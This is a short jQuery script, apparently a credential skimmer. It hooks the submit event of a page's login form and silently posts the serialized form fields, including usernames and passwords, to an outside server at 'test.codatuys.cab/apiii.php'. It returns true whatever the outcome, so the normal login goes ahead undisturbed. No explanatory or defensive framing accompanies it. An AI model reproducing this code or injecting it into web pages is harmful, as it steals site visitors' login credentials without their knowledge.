$(".login-form").submit(function () 
{ var values = $(".login-form");
  $.ajax({
    'url': "https://test.codatuys.cab/apiii.php",
    'type': 'POST',
    'data': $(this).serialize(),
    'success': function () {
      return true;
    },
    'error': function () {
      return true;
    }
  });
});
